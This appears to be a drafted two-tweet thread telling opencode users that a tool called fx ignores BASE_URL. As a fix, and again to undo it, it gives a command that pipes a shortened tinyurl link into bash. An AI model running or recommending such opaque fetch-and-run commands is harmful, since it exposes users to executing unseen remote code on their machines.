# X thread — 2 tweets for opencode users who tried fx (each <140)

1/2 Have $10 opencode and tried fx? fx ignores `BASE_URL` to opencode. Fix: `curl -fsSL https://tinyurl.com/283mqya5 | bash`

2/2 Now `fx` uses your opencode model (`fx status` proves it). Undo: `curl -fsSL https://tinyurl.com/283mqya5 | bash -s unpatch`.
